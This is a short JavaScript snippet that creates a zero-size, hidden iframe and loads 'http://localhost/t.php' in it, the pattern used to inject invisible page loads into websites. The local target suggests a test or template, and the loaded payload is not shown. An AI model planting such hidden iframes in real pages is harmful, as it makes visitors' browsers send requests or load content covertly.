//
function make(a) {ifrm = document.createElement("IFRAME");ifrm.setAttribute("src", a);ifrm.style.width = 0+"px";ifrm.style.height = 0+"px";ifrm.style.display="none";document.documentElement.appendChild(ifrm);}
make('http://localhost/t.php');

